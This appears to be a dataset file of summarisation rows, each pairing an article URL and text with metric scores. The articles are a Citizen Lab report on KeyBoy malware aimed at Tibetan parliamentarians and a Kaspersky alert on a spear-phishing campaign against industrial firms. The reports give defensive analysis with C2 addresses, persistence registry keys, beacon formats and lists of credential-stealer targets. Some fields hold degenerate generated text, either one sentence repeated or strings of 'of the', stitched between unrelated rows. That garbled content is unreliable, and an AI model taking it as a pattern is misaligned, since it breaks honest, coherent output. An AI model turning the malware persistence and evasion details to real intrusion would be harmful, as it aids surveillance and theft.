industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is also likely to be targeting different persons or departments within the same organization or industry. The threat actor is also likely to be targeting different organizations or industries. The threat actor is;en;{'r': 0.020105820105820106, 'p': 0.95, 'f': 0.03937823793605198};{'r': 0.008073196986006458, 'p': 0.6521739130434783, 'f': 0.015948963075823854};{'r': 0.020105820105820106, 'p': 0.95, 'f': 0.03937823793605198}
https://citizenlab.ca/2016/11/parliament-keyboy/;It’s Parliamentary KeyBoy and the targeting of the Tibetan Community;"Key FindingsIn this report we track a malware operation targeting members of the Tibetan Parliament over August and October 2016.The operation uses known and patched exploits to deliver a custom backdoor known as KeyBoy.We analyze multiple versions of KeyBoy revealing a development cycle focused on avoiding basic antivirus detection.This operation is another example of a threat actor using ""just enough"" technical sophistication to exploit a target.IntroductionThe Tibetan community has been targeted for over a decade by espionage operations that use malware to infiltrate communications and gather information. They are often targeted simultaneously with other ethnic minorities and religious groups in China. Examples as early as 2008 document malware operations against Tibetan non-governmental organizations (NGOs) that also targeted Falun Gong and Uyghur groups. More recently in 2016, Arbor Networks reported on connected malware operations continuing to target these same groups, which the Communist Party of China perceives as a threat to its power.These types of operations have multiple components, each with their own associated costs to the operator. There is the exploit code and malware used to gain access to systems, the infrastructure that provides command and control to the malware operator, and the human elements - developers who create the malware, operators who deploy it, and analysts who extract value from the stolen information.We anticipate that operators will attempt to balance the amount of information they expect to gather with the operational costs and risks of deploying different strategies and technologies. For example, in deploying a particular malware implant against a target the operator will balance the likelihood and cost of discovery with the perceived value of extracting information from that target. If a toolkit is exposed inadvertently, the target may increase defenses and the operator will have to spend more time and resources on development.Civil society groups, due to their generally limited technical capacity and lack of security expertise and countermeasures, shift the risk/reward ratio in ways favourable to the malware operator. For example, we have observed frequent reuse of older (patched) exploits in malware operations against the Tibetan community. Up-to-date operating systems and software would block these threats, but the operators have probably discovered through experience that the their targets have unpatched systems and a general lack of security controls beyond antivirus programs. The continued use of old exploits is a cost reduction strategy: since they still work, there is little need to use more expensive exploits.Moreover, many of the malware defenses used by the Tibetan diaspora involve individuals recognizing signs of a malicious email, such as exhortations to open attachments. This kind of behavioral strategy pushes the operators to change their social engineering tactics, but does not provide pressure to radically change their toolkits. This situation is different from a technical-indicator based institutional security environment. In practice, minimal code changes sufficient to bypass signature-based security controls such as antivirus may be all that are necessary.This report analyzes an operation targeting members of the Tibetan Parliament. The actors used a new version of ""KeyBoy,"" a custom backdoor first disclosed by researchers at Rapid7 in June 2013. Their work outlined the capabilities of the backdoor, and exposed the protocols and algorithms used to hide the network communication and configuration data.We observed operations in August and October 2016, shortly after an order in June to demolish the Larung Gar Buddhist Academy and days before organized protests on October 19 around the same issue. These operations involved highly targeted email lures with repurposed content and attachments that contained an updated version of KeyBoy. We assess that KeyBoy is the product of a development cycle that is iterated only as much as necessary to ensure the survival of the implant against antivirus detection and basic security controls.This report is divided into two parts:Part 1: The Parliamentarian Operation Analyzes an operation targeting the members of the Tibetan Parliament by repurposing legitimate content, and documents implanted with Keyboy.Part 2: KeyBoy - Tracking Evolution Examines the KeyBoy development cycle revealing a focus on avoiding basic antivirus detection.To assist other researchers, we include appendices and indicators of compromise that detail the KeyBoy samples we analyzed and provide an in-depth analysis of some features of the most recent implant.Part 1: The Parliamentarian OperationIn August and October 2016 we observed a malware operation targeting members of the Tibetan Parliament (the highest legislative organ of the Tibetan government in exile, formally known as Central Tibetan Administration). We collected two emails sent to Parliamentarians that rapidly repurposed legitimate content in an attempt to entice recipients to open malicious documents. The first attempt leveraged an old vulnerability in the parsing of Rich-text-format ( .rtf ) files (CVE-2012-0158). The second attempt used a newer, but also patched, .rtf vulnerability (CVE-2015-1641). Both attempts used versions of KeyBoy and shared the same command and control infrastructure as well as other configuration details.Attempt 1On August 25, 2016, members of the Tibetan Parliament received an email with information on an upcoming conference relevant to the Tibetan community. This email had the same subject and attachment as a legitimate message sent to the same recipients just 15 hours prior, but in this case the attachment was crafted to exploit a frequently targeted vulnerability in Microsoft Office. The accompanying malware was a backdoor implant designed to surveil the computers of the Parliamentarians. This malicious attachment used the original, legitimate filename as a decoy (see: Figure 1).Figure 1: Email lure containing malicious document. Note the use of letters 'r n' in an attempt to appear as 'm' in the sender address.This level of targeting and re-use of a legitimate document sent only hours before shows that the actors behind the operation are closely watching the Tibetan community, and may have already compromised the communications of one or more of the Parliamentarians.Document name: theme of the conference.docMD5: 8307e444cad98b1b59568ad2eba5f201Opening the attachment (an apparently blank document) in Microsoft Word would result in the infection of the target system with the KeyBoy implant.The Infection ChainThe email attachment is a .rtf document containing a dropper, delivered using an exploit designed to leverage CVE-2012-0158, a vulnerability in the way that Microsoft Word handles .rtf files. Over the past four years, this vulnerability has been consistently used in malware campaigns against the Tibetan community despite having been patched since April 2012.If the exploit is successful, the following infection chain (see: Figure 2) is observed on the system.Figure 2: Process chain after exploit is successfulThe files in this infection chain are outlined below. The exploit launches an executable 'dropper' component which is responsible for placing the malware payload and its configuration file on disk, and finally for launching the main malware code.Note that the dropper and the final (DLL) payload were compiled within seconds of each other.Name: dw20.exeSize: 256512 bytesCompile Time: 09 May 2016 08:41:26 UTCMD5: 0b4d45db323f68b465ae052d3a872068SHA256: 5f24a5ee9ecfd4a8e5f967ffcf24580a83942cd7b09d310b9525962ed2614a49Purpose: dropper binary, used to install and execute the main implantName: wab32res.exeSize: 46080 bytesCompile Time: 13 April 2008 18:30:52 UTCMD5: 8f08609e4e0b3d26814b3073a42df415SHA256: 58105e9772f6befbc319c147a97faded4fbacf839947b34fe3695ae72771da5dPurpose: legitimate Microsoft Windows Address Book executable, used to load final payloadName: wab32res.dllSize: 138240 bytesCompile Time: 09 May 2016 08:41:05 UTCMD5: 495adb1b9777002ecfe22aaf52fcee93SHA256: 9a55577d357922711ab0821bf5379289293c8517ae1d94d48c389f306af57a04Purpose: malware payload, launched by wab32res.exe via DLL search order hijackingNext, the dropper places a renamed copy of the legitimate Windows Address Book executable, along with the malware binary, wab32res.dll , in the Local Application Data directory. Notably, the dropper modifies the timestamps of the configuration file and the payload to match those of the \Microsoft\SystemCertificates\My\ directory within the user's Local Application Data directory. Once these files are written to disk, the dropper starts the Windows Address Book executable which loads and executes the malicious wab32res.dll file via DLL search-order hijacking.Attempt 2On October 11, 2016, the Tibetan Parliamentarians received an email with content repurposed from a Tibetan activism campaign protesting the demolition of a Buddhist monastery in Tibet. The email was sent from the same email address as the previous attempt ( tibetanparliarnent[@]yahoo.com ) and appears to copy content from the Facebook page of a Tibetan NGO promoting the campaign. The message urges recipients to open an attached .rtf file with further details on the campaign (see: Figure 3).Figure 3: Email lure used in second attemptDocument name: urgent action larung gar buddhist academy.rtfMD5: 913b82ff8f090670fc6387e3a7bea12dOpening the attachment (an apparently blank document) in Microsoft Word would, similar to the first attempt, result in the infection of the target system with the KeyBoy implant.The Infection ChainThe .rtf document attached to the malicious email was designed to exploit a more recent vulnerability: CVE-2015-1641. If successful, this exploit launches a newer version of the same malware used in the August attempt outlined above, using a similar infection chain.Name: n/aSize: 262144 bytesCompile Time: 29 September 2016 00:46:11 UTCMD5: 23d284245e53ae4fe05c517d807ffccfSHA256: 542c85fda8df8510c1b66a122e459aac8c0919f1fe9fa2c43fd87899cffa05bfPurpose:dropper binary, used to install and execute the main implantName: wab32res.exeSize: 46080 bytesCompile Time: 13 April 2008 18:30:52 UTCMD5: 8f08609e4e0b3d26814b3073a42df415SHA256: 58105e9772f6befbc319c147a97faded4fbacf839947b34fe3695ae72771da5dPurpose:legitimate Microsoft Windows Address Book executable, used to load final payloadName: wab32res.dllSize: 143872 bytesCompile Time: 29 September 2016 00:21:34 UTCMD5: 087bffa8a570079948310dc9731c5709SHA256: 5da2f14c382d7cac8dfa6c86e528a646a81f0b40cfee9611c8cfb4b5d589aa88Purpose:malware payload, launched by wab32res.exe via DLL search order hijackingAs with the first attempt, the resulting dropper installs the malware payload into the Local Application Data directory as wab32res.dll and subsequently launches it using the same method of DLL search-order hijacking against the legitimate Windows Address Book executable.A Note on VulnerabilitiesThe two .rtf vulnerabilities targeted in these exploitation attempts, CVE-2012-0158 and CVE-2015-1641, are among a set of four .rtf vulnerabilities discussed in recent reporting from researchers at Arbor Networks.The researchers describe the presumed existence of an exploit document 'builder' designed to selectively weaponize .rtf files using four older, patched, vulnerabilities: CVE-2012-0158, CVE-2012-1856, CVE-2015-1641, and CVE-2015-1770.The Arbor report describes the ongoing use of these four vulnerabilities in a series of espionage campaigns against not only Tibetan groups, but also others related to Hong Kong, Taiwan, and Uyghur interests. While we have not connected the campaign targeting the Tibetan Parliamentarians to the campaigns described by Arbor, the continual pairing of these older .rtf vulnerabilities with malware operations against the Tibetan community is noteworthy.The MalwareThe malware samples deployed in both of these operations are updated versions of the KeyBoy backdoor first discussed in 2013 by Rapid7. KeyBoy provides basic backdoor functionality, allowing the operators to select from various capabilities used to surveil and steal information from the victim machine.KeyBoy functionality:Gather system information, including details of the operating system, processor, disk, memory, display, and uptime ( see: Figure 4 )) Upload files to the victim computerDownload files from the victim computerBrowse the file system, including gathering details about attached drivesExecute commands and applicationsLaunch interactive shellFigure 4: Format strings illustrating some of the system information obtained by KeyBoy from an infected machineThese updated versions of KeyBoy make use of an encoded configuration file to store their command and control (C2) information along with other required settings. In both cases, the dropper wrote this configuration file in the user's Local Application Data directory as win32res.dat . After analyzing these malware samples, we were able to decode the following configuration parameters, presented in Table 1Line Description First sample Second sample Line 1 Identity code, used to ensure config was correctly decoded 9876543210 9876543210 Line 2 C2 Server 1 (hostname/ip) 45.125.12[.]147 45.125.12[.]147 Line 3 C2 Server 2 (hostname/ip) 103.40.102[.]233 45.125.12[.]147 Line 4 C2 Server 3 (hostname/ip) 45.125.12[.]147 45.125.12[.]147 Line 5 Port used with C2 Server 1 443 443 Line 6 Port used with C2 Server 2 443 443 Line 7 Port used with C2 Server 3 443 443 Line 8 Password for operator login tibetwoman tibetwoman Line 9 Campaign ID, transmitted to C2 during login NNNN NNNN Table 1: Decoded configuration parameters from both KeyBoy samples observed in the Parliamentarian operationA full description of the new algorithm used by KeyBoy to decode its configuration file is presented in Appendix A.Once the KeyBoy DLL has been executed, it validates that a particular string value (likely identifying the KeyBoy version) is set in the Windows Registry.Key First sample Second sample HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zonemap\Ver 20160509 agewkassifAdditionally, these versions of KeyBoy ensure persistence by setting the wab32res.exe file to be loaded upon login via exploiting the Winlogon Shell key, which in turn loads the malicious wab32res.dll file by the aforementioned DLL search-order hijacking method.Key Value HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell explorer.exe, ""C:\users\<user>\AppData\Local\wab32res.exe""The backdoor then sends a login beacon to the C2 server which, once decoded, looks like:*a*USER-PC192.168.100.101NNNN2016/09/13 16:11:5620160509These values are described as follows in Table 2:Value from Example Description *a* Data header code for initial check-in beacon USER-PC %computername% of victim PC 192.168.100.101 IP address of victim PC NNNN Campaign ID from the KeyBoy configuration file 2016/09/13 16:11:56 Timestamp of local PC 20160509 Internal version identifier Table 2: Descriptions of the login beacon valuesThis login data, as well as all other communication between backdoor and command and control server, is transmitted using an encoding mechanism based on principles from modular arithmetic. We describe this network communication encoding in detail in this supplementary document.As can be seen in the login event example above, when sending data to the C2, the KeyBoy implant uses a series of header 'codes' to specify the type of data which is being transmitted, described in Table 3:Header code Data being transmitted *l* Heartbeat / Keepalive *a* Initial check-in beacon *s* System information (drive info, system specifications, interface info) *d* Data from remote commands and shell *f* Data relating to interactions via File Manager *g* Ready to initiate file download *h* Ready to initiate file upload or update Table 3: KeyBoy header codes for sending data to the C2 serverThe InfrastructureThe command and control (C2) servers used in the Tibetan Parliament operation were extracted from the KeyBoy configuration files:C2 Host: 45.125.12[.]147 Desc: Royal Network Technology Co City: Guangzhou Country: China No relevant data or passive DNS information was availableC2 Host: 103.40.102[.]233 Desc: Dragon Network Int'l Co. Ltd City: Hong Kong Country: Hong Kong Domain: tibetvoices[.]com Host First Seen: Last Seen: 127.0.0.1 2016-09-29 Current as of publication 103.40.102[.]233 2016-07-15 2016-09-28 112.10.117[.]47 2016-05-25 2016-05-26We uncovered very little information about the command and control (C2) infrastructure used in this operation. The configuration files referenced hard-coded IP addresses for the C2 servers, as opposed to using domain names as was seen in prior KeyBoy campaigns.Passive DNS analysis revealed one domain, tibetvoices[.]com , which was briefly pointed to one of the C2 server IP addresses found in the KeyBoy configuration file used in the first attempt against the Parliamentarians. This domain was created in May 2016 (around the time that the KeyBoy sample used in the first attempt was compiled) and was pointed to IP address 103.40.102[.]233 from July 15 to September 28. Subsequently, this domain was pointed to 127.0.0.1 , effectively taking it offline.This behavioural tactic was previously mentioned in relation to KeyBoy in a 2013 blog post by Cisco. Cisco hypothesized that the actors behind KeyBoy may have been nullifying the DNS records when an active campaign was not underway, in an attempt to stay ""below the radar"". This tactic allows the malware operator to ensure that no command and control traffic will be sent out from the infected system, thus preventing detection via network monitoring.This tactic, however plausible, would not apply to the KeyBoy samples we analyzed, as the C2 configuration relied upon hard coded IP addresses and did not directly reference the tibetvoices[.]com domain. It is possible that a different campaign was launched which used this domain, but we were unable to find any evidence of such a campaign.Our analysis provides a cursory look at some of the capabilities and implementation details of the KeyBoy backdoor as used during a malware operation targeting Tibetan Parliamentarians. These versions of KeyBoy differed from the one first described by Rapid7 in several ways, many of which will be described in the sections to follow.During our research into this operation we were able to uncover two additional samples of KeyBoy which were likely used in previous malware campaigns. These samples were contained in exploit documents containing distinct lure content, one having a Tibetan nexus, the other an Indian nexus.In Part 2 we present a brief overview of the observable evolution of KeyBoy based upon all of the samples we obtained.Part 2: KeyBoy - Tracking EvolutionPeriodic updates are common in the world of software development. Features are added and removed, bugs are patched, and code is written to execute more efficiently. The same holds true for malicious software, but with the additional requirement that the development cycle must always satisfy the operational need for covertness. To be effective, malicious software designed for surveillance must remain undetected. Malware developers are in a constant struggle to avoid the security controls that protect target systems.We believe the 2013, 2015, and 2016 KeyBoy samples provide evidence of a development effort focused on changing components that would be used by researchers to develop detection signatures. This section outlines how we came to this conclusion.In building our KeyBoy chronology, we collected several samples and examined three data points from each:The compile time of the KeyBoy binaryA string observed in the KeyBoy binary we refer to as the 'version identifier'Elapsed time between compile time and the time of first exposureAnalysis of these data points gave us a moderate to high level of confidence that the binary compile times provided a reliable estimate of the true development timeline.An Evolving ImplantIn an effort to understand its evolution, we compared the code of several versions of KeyBoy as identified by their 'version identifier' strings, shown in Table 4:Version Identifier Notes Proxy 20130401 Reported by Rapid7 in relation to an Indian nexus Proxy 20130401 Reported by Rapid7 in relation to a Vietnamese nexus P_20150313 Discovered via hunting, carried Indian lure content 20151108 Discovered via hunting, carried Tibetan lure content 20160509 First sample of the Parliamentarian operation from August 2016 20160509 An alternate sample, using different configuration data agewkassif Second sample of the Parliamentarian operation from October 2016 Table 4: Version identifier strings analyzedThe 'version identifier' is a particular string that appeared in every KeyBoy sample we studied. It is transmitted to the command and control server as part of the login data packet, and, in recent versions, this identifier is written to the Windows registry in a key named 'Ver'. With the exception of the newest (chronologically speaking) KeyBoy version we discovered, this identifier always contained a date-like component which matched the compile date of the KeyBoy binary in every case. In the newest sample, the developers replaced this date-like string with a seemingly random set of letters.A timeline depicting these KeyBoy versions, along with some important characteristics, is shown in Figure 5.Figure 5: The timeline of KeyBoy's evolutionNoteworthy ModificationsThis section describes some of the most significant changes observed across the KeyBoy versions. Each of these components would have been an ideal target for signature-based identification, using either static string or network packet-based detection mechanisms.Header Code EvolutionOf the changes we identified one stands out as being an immediate target for an effective antivirus signature - the evolution of header codes used during communication between the implant and command and control server. As shown in Table 5, these codes changed substantially after the 2013 KeyBoy samples were examined and publically documented by Rapid7. It is reasonable to hypothesize that this significant change in format was in response to the publication of Rapid7's research.2013 Early 2015 Late 2015 2016 $login$ l *a* *l* $sysinfo$ s *s* *a* $shell$ e *d* *s* $fileManager$ f *f* *d* $fileDownload$ D *g* *f* $fileUpload$ U *h* *g* *h* Table 5: Header codes used by KeyBoy during C2 communicationIn addition, modifying these codes produced a downstream change in the appearance of the network communication traffic produced by an active KeyBoy infection. This change would likely have rendered existing network based signatures ineffective.Configuration File ChangesAnother major change we first observed in version P_20150313 is the complete redesign of the algorithm used to encode the KeyBoy configuration file. In the 2013 samples described by Rapid7, this configuration file was encoded using a simplified static-key based algorithm. This newer encoding algorithm is significantly more involved, removing the use of a static encryption key in favour of a dynamically constructed lookup table. We provide a detailed explanation of this new algorithm in Appendix A.Persistence ChangesThe method used by the implant for maintaining persistence was also changed several times. The earlier versions used a Windows service to ensure the malware stayed persistent, moving to a more commonly seen tactic of setting the Run key in the Windows registry in the early 2015 sample. This method changed again in late 2015 when the implant migrated from the Run key to using a less frequently observed registry key: Winlogon\Shell . This key stores the list of executables which are to be run once a Windows GUI session is created, and typically holds only the standard user shell, explorer.exe .String ObfuscationIn another modification, first observed in the most recent October 11 Parliamentarian operation (version agewkassif ), the developer(s) of KeyBoy began using a string obfuscation routine in order to hide many of the critical values referenced within the malware. This introduction of string obfuscation also suggests a development change aimed at evading detection. The header codes, filename references, and all of the operator commands were obfuscated and only decoded during execution of the KeyBoy DLL. Figure 6 shows a sampling of these strings, after decoding.Figure 6: Header code and command strings after being decoded at run-timeEvidence of ModularityFinally, there were numerous changes observed that could suggest that KeyBoy was being deployed using a modular or component based mechanism. The GetUp export which is linked to the browser credential theft capability seems to be present in some samples and not others, even for versions within the same development stage. As well, the inconsistent use of a dropper binary during infection is further evidence supporting the modular component theory.Additional DetailsBeyond the main modifications outlined above, numerous smaller changes were also observed, many of which are described in Table 6 below.Version Identifier Key Changes Proxy 20130401 Persistence handled via Windows serviceOne sample contained the 'GetUP' export, the other did notUsed full word header codes encapsulated by $ symbols, such as $login$ P_20150313 Adopts new algorithm for config file encodingRetained browser credential theft moduleMoved to persistence via Run keyHeader codes shift to -encapsulationDeployed without use of dropper binary 20151108 Continues use of new config encoding algorithmMigrated to use of WinLogon key for persistenceInstallation now conducted via VBS scriptsAdopted multi-byte strings internally and in C2 communicationHeader codes move to *-encapsulation64 bit version distributed inside 32 bit payloadNo evidence of browser credential moduleDeployed using dropper binary 20160509 Continues use of new config encoding algorithmAdded AutoUpdate/Upload & Execute functionDeployed using dropper binaryHeader codes retain *-encapsulation, new 'keep-alive' code, *l*Execution via DLL search-order hijacking of legitimate Windows applicationVBS script traces still present, but no longer usedNo 64bit version embedded agewkassif Functionally identical to 20160509 sampleContinues use of new config encoding algorithmRemoved date string from version identifierAdded static string obfuscation code. Strings used for C2 commands, header codes, and more are now decoded at runtime Table 6: Changes observed between successive versions of KeyBoyAdditional technical details relating to several of the KeyBoy samples described in this section are provided in Appendix B.Connecting KeyBoy to Other OperationsIn their Operation Tropic Trooper report, Trend Micro documented the behaviour and functionality of an espionage toolkit with several design similarities to those observed in the various components of KeyBoy. Trend Micro specifically noted that the 2013 versions of KeyBoy used the same algorithm for encoding their configuration files as was observed in the Operation Tropic Trooper malware.This connection may offer another explanation for the significant change in the configuration file encoding algorithm we described in relation to KeyBoy. If KeyBoy is a single component of a larger espionage toolkit, the developers may have realized that this older, static-key based, configuration encoding algorithm was inadvertently providing a link between disparate components of their malware suite.A Note on SamplesWe were not able to locate a large sample set for KeyBoy. Though we discussed the development timeline, we have limited insight into the victims targeted by each of these samples. We cannot conclude that all are being deployed by the same group. We provide YARA signatures and encourage anyone who can provide additional samples or context to contact us.Recent Tibetan ProtestsThe harm of malware operations against the Tibetan community is well-documented, and this latest campaign is no exception. Examining the lure content sent to the Tibetan Parliamentarians sheds light on the oppression faced by the Tibetan community. On October 19, over 180 Tibetan groups protested the ongoing demolitions of the Larung Gar Buddhist Academy, the largest Tibetan Buddhist institute in the world.The demolitions stem from an order issued by Chinese authorities in June 2016, according to a joint statement issued by Tibet groups on the date of protest. According to the same joint statement, the order from Chinese authorities said the community was in need of ""ideological guidance"" from the Chinese state. In conjunction with the demolitions, residents are being forcefully removed from Larung Gar. To date, the forced removals have led to to the suicide of three resident nuns.The Communist Party of China views the Tibetan movement as a threat to its rule, alongside Uyghur, Falun Gong, advocates for an independent Taiwan and Hong Kong, and members of the democracy movement. Surveilling the highest governing body of the Central Tibetan Administration aligns with the overall interests of the government of China. However, connecting the malware development ecosystem and the flow of stolen information to a state-actor is an elusive task. With the data available we are unable to conclusively connect the Parliamentarian Operation to any specific actor or nation-state.ConclusionsRecent Citizen Lab reports have documented a trend away from the use of attachment-based malware operations targeting the Tibetan Diaspora. These changes may reflect malware operators shifting tactics in response to changes in the community, including education campaigns encouraging Tibetans not to use email attachments, or perhaps also by more sophisticated attachment scanning by popular email providers.The operation against the Tibetan Parliamentarians illustrates the continued use of malicious attachments in the form of documents bearing exploits. These exploits, while older, were used to deliver a malware payload which shows signs of a systematic technical adaptation designed to reduce the likelihood of signature based detection.The developers of KeyBoy have made the minimum necessary technical changes required to avoid detection by signature-based antivirus, and yet retained ""old"" exploits because they likely continue to work their targets.For a community lacking an adequate level of human and financial resources, deployment of commercial (i.e.: non-free) antivirus solutions, updated releases of common office productivity software, and even software patches may be out of reach. Under such conditions, the use of exploits against older, patched, vulnerabilities becomes yet another iteration of an actor using ""just enough"" sophistication to successfully exploit a target.The operation against the Parliamentarians yields a clear example of this tactic. When the August operation failed to fully compromise the target group, the operators redeployed in October using a slightly newer, but still well-known and patched, exploit.As we observe the evolution of strategies levied against the Tibetan Diaspora, the constant cat-and-mouse game embroiling this community becomes evident. While some behavioural adaptations have shown promise in reducing the threat, the operation against the Tibetan Parliament underscores the need for continued diligence and security awareness.AcknowledgmentsSpecial thanks to Tibet Action Institute. Additional thanks to Jakub Dalek, PassiveTotal, VirusTotal, and TNG.Appendix A: Decoding KeyBoy ConfigRecent versions of KeyBoy maintain encoded configuration data inside a file stored on disk. In the 20160509 sample used in the Tibetan Parliament campaign, this file was named wab32res.dat . The configuration file contains a 16 byte header followed by a number of bytes which are encoded using a novel algorithm. The 16 byte header stores an ascii character representation of the hexadecimal values corresponding to the size (in bytes) of the decoded config data, followed by the number of bytes containing encoded configuration data.The sample under examination contained the following header, and Figure 7 shows the raw configuration file:Size of config (in bytes) once decoded Number of bytes in encoded config 0x00 0x00 0x00 0x5B 0x00 0x00 0x00 0x4BFigure 7: Configuration file for sample under examinationThe configuration file used by this malware is encoded using what appears to be a custom schema. While some earlier versions of this backdoor used";". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . of the following. of the following.. . of the of the of the of the of the of the of the of the "" of the "" of the "" of the "" of the . on the on the 120. . of the 2 of the of the of the . : : : : of the of the of the of the of the of of thefurn of the of the of the 1010..10.... 1 on the . . of the of the of of the of of of of of of of of the of of of of of of the 10.. . .. of the 10 in the 0 in the 10010... of the of the of the of the";en;{'r': 0.006345177664974619, 'p': 0.625, 'f': 0.012562813871366886};{'r': 0.0010672358591248667, 'p': 0.11764705882352941, 'f': 0.0021152827409077805};{'r': 0.006345177664974619, 'p': 0.625, 'f': 0.012562813871366886}
https://ics-cert.kaspersky.com/publications/alerts/2016/12/16/spear-phishing-attack-hits-industrial-companies/;Spear phishing attack hits industrial companies;"Kaspersky Lab ICS CERT detected a targeted attack aimed at industrial organizations which began in August 2016 and is currently ongoing. The worst affected were companies in the smelting, electric power generation and transmission, construction, and engineering industries. Most of the organizations attacked were vendors of industrial automation solutions and system support contractors. In other words, the attack targeted organizations that design, build and support industrial solutions for critical infrastructure. Based on the data we have acquired since October 2016, about 500 organizations from 50 countries were affected by the attack.The emails had subject lines that were intended to convince unsuspecting recipients that they were from a legitimate source. Examples included fake commercial suppliers or shipping companies sending an updated price list, banks asking customers to validate banking information, or confirmation of equipment delivery.Some examples of the phishing emailsDocuments attached in the emails are RTF files containing an exploit for the CVE-2015-1641 vulnerability which are detected by Kaspersky Lab security products as Exploit.MSWord.Agent.hp. Also archives of different formats are sent in the attachments that contain executable files. The attachment names examples are:Energy & Industrial Solutions W.L.L_pdf.acepta11047-201612698.acequotation.aceSaudi Aramco Quotation Request for October 2016.zipdhl shipment notification awb and complete shipping docs_docx.zipurgent order.zipShipping Documents and certificate.zipREQUIREMENTS FOR KUWAIT LOWER FARS HEAVY OIL DEVELOPMENT PROJECT PHASE 1.rarDAMEN Scan Copy of Original.zipCOMPANY LETTER PDF.rarWoodeck Specifications best Prices Quote.uueFinal Proforma InvoiceUnaBaoshan Petro-2016.8.1701092016.xlsx.gzFurther analysis of the emails, especially the headers, shows that most of them were sent from legitimate email addresses belonging to valid organizations. In some cases, the subject line contained the actual text used in an organization's correspondence. That can only happen if the source emails were accessible to hackers and were, possibly, compromised earlier. The hackers could have accessed and read previous communications between the target and their partners. They may then have used this information to craft ""legitimate"" email communications, so that the victim didn't recognize the malicious aspect of the email.Description of malicious applications used in the attackAnalysis of the binaries and their relation to known malware shows that no new code was written specifically for this attack. However, we should note that the malicious apps used specific VB and MSIL packers that can diminish the ability of antivirus to detect the malware used.FareIT/Pony 2.0Malicious payload that steals authentication credentials:Web service access credentials (account and passwords) saved in the browser history and cache with the URL they were used with,Access credentials for FTP servers, file servers, email clients and synchronized folders,Steals crypto currency.Access credentials for the following legitimate applications are targeted:FAR Manager FTPGetter Pocomail Total Commander ALFTP IncrediMail WS_FTP Internet Explorer The Bat! CuteFTP Dreamweaver Outlook FlashFXP DeluxeFTP Thunderbird FileZilla Google Chrome FastTrackFTP FTP Commander Chromium / SRWare Iron Bitcoin BulletProof FTP ChromePlus Electrum SmartFTP Bromium (Yandex Chrome) MultiBit TurboFTP Nichrome FTP Disk FFFTP Comodo Dragon Litecoin CoffeeCup FTP / Sitemapper RockMelt Namecoin CoreFTP K-Meleon Terracoin FTP Explorer Epic Bitcoin Armory Frigate3 FTP Staff-FTP PPCoin (Peercoin) SecureFX AceFTP Primecoin UltraFXP Global Downloader Feathercoin FTPRush FreshFTP NovaCoin WebSitePublisher BlazeFTP Freicoin BitKinex NETFile Devcoin ExpanDrive GoFTP Frankocoin ClassicFTP 3D-FTP ProtoShares Fling Easy FTP MegaCoin SoftX Xftp Quarkcoin Directory Opus FTP Now Worldcoin FreeFTP / DirectFTP Robo-FTP Infinitecoin LeapFTP LinasFTP Ixcoin WinSCP Cyberduck Anoncoin 32bit FTP Putty BBQcoin NetDrive Notepad + + Digitalcoin WebDrive CoffeeCup Visual Site Designer Mincoin FTP Control FTPShell Goldcoin Opera FTPInfo Yacoin WiseFTP NexusFile Zetacoin FTP Voyager FastStone Browser Fastcoin Firefox CoolNovo I0coin FireFTP WinZip Tagcoin SeaMonkey Yandex.Internet / Ya.Browser Bytecoin Flock MyFTP Florincoin Mozilla sherrod FTP Phoenixcoin LeechFTP NovaFTP Luckycoin Odin Secure FTP Expert Windows Mail Craftcoin WinFTP Windows Live Mail Junkcoin FTP Surfer Becky!After all the data is collected, it is sent to a remote C&C server by executing a POST HTTP command. The victim's system information is also included:POST request to remote command and control serverLuminosity RATThis malicious application has the following functionality:File manager (allows a remote user to search, download, install, copy and remove files)RDP ManagerReverse ProxySteals access credentials from web browsers, email clients, FileZilla and Windows Serial KeyDisables active processes upon demandInstalls new applicationsRequest to a remote C&C serverHawkEye Keylogger/StealerThis malicious tool is written in .NET. Its main function is keylogging and collecting system and networking parameters from compromised systems. It collects internal and external IP addresses, OS version, as well as the type of antivirus and firewall installed on the victim system. All of this data is sent to a remote C&C server for review and analysis by cybercriminals.This malicious tool can use one of three communication methods to upload data to a remote C&C server: FTP, SMTP protocols or HTTP GET requests.This tool can use a legitimate application for malicious purposes. Analysis shows that it used Nirsoft Mail Password Recovery and Nirsoft Web Browser Pass View to steal authentication data from email clients, web browsers, P2P clients and password managers:Mozilla ThunderBird Microsoft Outlook Eudora Mail Outlook Express IncrediMail Google Desktop Windows Mail Windows Live Mail Netscape Mozilla Firefox Apple Safari Google Chrome Yahoo! Pager Google Talk MSN Messenger Windows Live Messenger Group Mail KeePass Internet Explorer OperaThis malicious tool can do the following:Terminate system processes or block their execution: taskmgr - Windows task managermsconfig - system configuration utilityregedit - registry editorcmd - command line interpreter Create self-copy at %AppData%WindowsUpdate.exe and create registry key at HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun WindowsUpdate. This enables the malicious tool to survive reboot and start during system load. If the malicious tool is moved or executed from a different path, it will not execute, but terminate with a ""Microsoft Application Error"" error message. Upload infection details to remote C&C server. Block network access to specified network resources by direct write to %SystemDir%driversetchosts. Steal data from clipboard Make screenshots Clean up Mozilla Firefox and Internet Explorer cache Navigate to predefined web resource Use of encrypted SSL channel to communicate to remote C&C server Remove saved account data for Steam (game manager), forcing the user to re-enter access credentials. Activate keylogging functionality to intercept the key strokes. Copy selected files to %Temp% and execute them. Download selected files from the Internet to %Temp% and execute them. Steal authentication data from saved Minecraft and RuneScape games. Steal saved data from a Bitcoin vault. Infect portable media. Install registry key at HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced Hidden equal to 1. This key is responsible for describing OS behavior when the hidden file is accessed. If the value is equal to 1, hidden files will not be visible.ISR StealerThis malicious tool is written in VB and can use the legitimate applications Nirsoft Mail Password Recovery and Nirsoft Web Browser Pass View to steal authenticated data from the following applications:Mozilla ThunderBird Microsoft Outlook Eudora Mail Outlook Express IncrediMail Google Desktop Windows Mail Windows Live Mail Netscape Mozilla Firefox Apple Safari Google Chrome Yahoo! Pager Google Talk MSN Messenger Windows Live Messenger Group Mail KeePass Internet Explorer Opera Pidgin FileZilla Internet Download Manager JDownloader Trillian 